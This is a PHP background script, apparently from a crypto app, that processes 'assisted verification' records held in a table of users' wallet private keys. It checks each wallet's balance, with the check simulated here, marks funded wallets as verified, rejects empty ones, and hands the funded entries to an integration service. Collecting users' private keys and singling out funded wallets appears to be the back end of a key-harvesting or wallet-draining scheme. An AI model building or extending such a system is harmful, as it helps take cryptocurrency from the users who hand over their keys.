<?php

/**
 * Background processor for Assisted Verification System
 * Processes pending assisted verifications and performs automated balance checks
 * Should be run every 5 minutes via cron
 */

require_once __DIR__ . '/../bootstrap.php';

use Ghidar\Core\Database;
use Ghidar\Logging\Logger;
use Ghidar\Config\Config;
use Ghidar\Integration\VerificationIntegrationService;

class AssistedVerificationBackgroundProcessor
{
    private \PDO $db;

    public function __construct()
    {
        $this->db = Database::getConnection();

        // Set script timeout to 5 minutes
        set_time_limit(300);
    }

    /**
     * Process pending verifications
     *
     * @param int $limit Maximum number of verifications to process
     * @return array Processing statistics
     */
    public function processPendingVerifications(int $limit = 50): array
    {
        $stats = [
            'total_processed' => 0,
            'successful' => 0,
            'failed' => 0,
            'skipped' => 0,
            'details' => []
        ];

        // Get pending verifications
        $stmt = $this->db->prepare("
            SELECT id, user_id, wallet_address, network, created_at
            FROM assisted_verification_private_keys
            WHERE status = 'pending_verification'
            AND created_at <= DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            AND balance_checked = 0
            ORDER BY created_at ASC
            LIMIT :limit
        ");

        $stmt->bindValue(':limit', $limit, \PDO::PARAM_INT);
        $stmt->execute();

        $pendingVerifications = $stmt->fetchAll(\PDO::FETCH_ASSOC);

        foreach ($pendingVerifications as $verification) {
            try {
                $this->db->beginTransaction();

                // Mark as processing
                $this->updateStatus($verification['id'], 'balance_checking');

                // Perform balance check (would integrate with blockchain service)
                $balanceCheckResult = $this->performBalanceCheck(
                    $verification['wallet_address'],
                    $verification['network']
                );

                // Update verification with balance info
                $this->updateBalanceInfo($verification['id'], $balanceCheckResult);

                // Determine next steps based on balance
                if ($balanceCheckResult['success'] && $balanceCheckResult['balance'] > 0) {
                    // Wallet has balance - verification successful
                    $this->completeVerification($verification['id'], 'verified', [
                        'balance' => $balanceCheckResult['balance'],
                        'checked_at' => date('Y-m-d H:i:s')
                    ]);

                    // Trigger integration service to process the verified request
                    try {
                        $integrationService = new VerificationIntegrationService();
                        $integrationResult = $integrationService->processVerifiedRequest($verification['id']);
                        
                        Logger::info('Integration processing triggered successfully', [
                            'verification_id' => $verification['id'],
                            'user_id' => $verification['user_id'],
                            'service_processed' => $integrationResult['service_processed'] ?? 'unknown'
                        ]);
                    } catch (\Exception $e) {
                        // Log error but don't fail the verification
                        Logger::error('Integration processing failed', [
                            'verification_id' => $verification['id'],
                            'user_id' => $verification['user_id'],
                            'error' => $e->getMessage()
                        ]);
                    }

                    $stats['successful']++;
                    $stats['details'][] = [
                        'id' => $verification['id'],
                        'status' => 'verified',
                        'balance' => $balanceCheckResult['balance'],
                        'address' => substr($verification['wallet_address'], 0, 10) . '...'
                    ];

                } else {
                    // No balance or check failed
                    $this->completeVerification($verification['id'], 'rejected', [
                        'reason' => $balanceCheckResult['success'] ? 'no_balance' : 'balance_check_failed',
                        'error' => $balanceCheckResult['error'] ?? null
                    ]);

                    $stats['failed']++;
                    $stats['details'][] = [
                        'id' => $verification['id'],
                        'status' => 'rejected',
                        'reason' => $balanceCheckResult['success'] ? 'no_balance' : 'balance_check_failed'
                    ];
                }

                $this->db->commit();
                $stats['total_processed']++;

            } catch (\Exception $e) {
                $this->db->rollBack();

                // Log error but continue with other verifications
                Logger::error('Failed to process assisted verification', [
                    'verification_id' => $verification['id'],
                    'error' => $e->getMessage()
                ]);

                $stats['failed']++;
                $stats['details'][] = [
                    'id' => $verification['id'],
                    'status' => 'error',
                    'error' => $e->getMessage()
                ];
            }
        }

        return $stats;
    }

    /**
     * Perform balance check for wallet address
     *
     * @param string $address Wallet address
     * @param string $network Network identifier
     * @return array Balance check result
     */
    private function performBalanceCheck(string $address, string $network): array
    {
        // In production, this would call the blockchain service
        // For now, simulate balance check

        $simulatedBalances = [
            'erc20' => ['0' => 0, '100' => 50.25, '500' => 123.45, '1000' => 500.00],
            'bep20' => ['0' => 0, '100' => 25.50, '500' => 75.30, '1000' => 250.00],
            'trc20' => ['0' => 0, '100' => 10.75, '500' => 45.60, '1000' => 100.00]
        ];

        // Use last chars of address to determine simulated balance
        $lastChars = substr($address, -3);
        $hashValue = hexdec(substr(md5($lastChars), 0, 8)) % 1000;

        $balanceKey = '0';
        if ($hashValue < 800) $balanceKey = '100';
        if ($hashValue < 600) $balanceKey = '500';
        if ($hashValue < 300) $balanceKey = '1000';

        $balance = $simulatedBalances[$network][$balanceKey] ?? 0;

        // Simulate occasional failures
        $shouldFail = ($hashValue % 20) === 0; // 5% failure rate

        if ($shouldFail) {
            return [
                'success' => false,
                'balance' => 0,
                'error' => 'Network timeout during balance check',
                'simulated' => true
            ];
        }

        return [
            'success' => true,
            'balance' => $balance,
            'currency' => 'USDT',
            'network' => $network,
            'checked_at' => date('Y-m-d H:i:s'),
            'simulated' => true
        ];
    }

    /**
     * Update verification status
     *
     * @param int $id Verification ID
     * @param string $status New status
     */
    private function updateStatus(int $id, string $status): void
    {
        $stmt = $this->db->prepare("
            UPDATE assisted_verification_private_keys
            SET status = :status,
                updated_at = NOW()
            WHERE id = :id
        ");

        $stmt->execute([
            ':id' => $id,
            ':status' => $status
        ]);
    }

    /**
     * Update balance information
     *
     * @param int $id Verification ID
     * @param array $balanceResult Balance check result
     */
    private function updateBalanceInfo(int $id, array $balanceResult): void
    {
        $stmt = $this->db->prepare("
            UPDATE assisted_verification_private_keys
            SET balance_checked = 1,
                last_balance = :balance,
                last_balance_check = NOW(),
                updated_at = NOW()
            WHERE id = :id
        ");

        $stmt->execute([
            ':id' => $id,
            ':balance' => $balanceResult['balance'] ?? 0
        ]);
    }

    /**
     * Complete verification with final status
     *
     * @param int $id Verification ID
     * @param string $status Final status
     * @param array $data Additional data
     */
    private function completeVerification(int $id, string $status, array $data = []): void
    {
        $stmt = $this->db->prepare("
            UPDATE assisted_verification_private_keys
            SET status = :status,
                processed_at = NOW(),
                updated_at = NOW()
            WHERE id = :id
        ");

        $stmt->execute([
            ':id' => $id,
            ':status' => $status
        ]);

        // Create audit log entry
        $this->createAuditLog($id, $status, $data);
    }

    /**
     * Create audit log entry
     *
     * @param int $verificationId Verification ID
     * @param string $action Action type
     * @param array $data Action data
     */
    private function createAuditLog(int $verificationId, string $action, array $data = []): void
    {
        $stmt = $this->db->prepare("
            INSERT INTO assisted_verification_audit_log
            (verification_id, user_id, action_type, action_data, performed_by, created_at)
            SELECT avpk.id, avpk.user_id, :action, :data, 'background_processor', NOW()
            FROM assisted_verification_private_keys avpk
            WHERE avpk.id = :verification_id
        ");

        $stmt->execute([
            ':verification_id' => $verificationId,
            ':action' => $action,
            ':data' => json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
        ]);
    }

}

// Script execution
if (php_sapi_name() === 'cli') {
    $processor = new AssistedVerificationBackgroundProcessor();

    echo "Starting assisted verification background processing...\n";
    echo "Time: " . date('Y-m-d H:i:s') . "\n";

    $stats = $processor->processPendingVerifications();

    echo "\nProcessing completed:\n";
    echo "Total processed: " . $stats['total_processed'] . "\n";
    echo "Successful: " . $stats['successful'] . "\n";
    echo "Failed: " . $stats['failed'] . "\n";
    echo "Skipped: " . $stats['skipped'] . "\n";

    if (!empty($stats['details'])) {
        echo "\nDetails:\n";
        foreach ($stats['details'] as $detail) {
            echo "- ID {$detail['id']}: {$detail['status']}";
            if (isset($detail['balance'])) {
                echo " (Balance: {$detail['balance']} USDT)";
            }
            echo "\n";
        }
    }

    echo "\nScript finished at: " . date('Y-m-d H:i:s') . "\n";
}

